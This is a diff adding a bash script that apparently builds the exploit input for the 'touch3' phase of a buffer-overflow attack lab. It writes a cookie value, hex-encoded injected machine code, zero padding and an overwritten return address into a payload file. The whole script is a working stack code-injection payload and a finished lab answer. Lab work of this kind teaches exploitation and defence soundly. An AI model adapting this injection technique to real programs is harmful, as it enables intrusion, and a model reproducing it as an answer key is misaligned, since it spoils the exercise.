@@ -1,0 +1,12 @@
+#!/bin/bash
+
+cd ..
+
+echo "5788e9e7" > injection/touch3.txt
+
+utils/h2r 00 bf 78 2c 67 55 c7 04 24 98 1a 40 00 c3 >> injection/touch3.txt
+
+printf '0%.0s' {1..34} >> injection/touch3.txt
+
+utils/h2r 81 2c 67 55 >> injection/touch3.txt
+
